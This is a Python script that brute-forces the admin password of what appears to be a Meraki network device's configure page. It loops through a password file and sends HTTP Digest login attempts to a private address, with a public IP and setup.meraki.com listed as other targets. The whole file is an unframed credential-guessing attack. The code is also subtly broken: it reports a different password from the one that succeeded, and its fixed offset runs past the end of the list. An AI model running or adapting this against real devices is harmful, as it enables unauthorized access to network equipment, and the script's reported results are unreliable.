import requests
from requests.auth import HTTPDigestAuth

passwordcounter = 0

testurl = 'https://www.google.com'
url1 = 'http://172.16.1.1/configure'
url2 = 'http://setup.meraki.com/configure'
url3 = 'http://138.207.175.210/configure'
url4 = 'http://172.16.1.1/configure/index.cgi'


with open('pwd.txt') as file:
    passwords = [line.rstrip() for line in file]


for i in range(len(passwords)):
    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i+186000]))
    if request.status_code == 200:
        print(f'\n\nSuccess! Password is \"{passwords[i]}\"')
        break
    print(f'{i+186000}:{request.status_code}, ', end='')


# r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
# print(r.status_code)
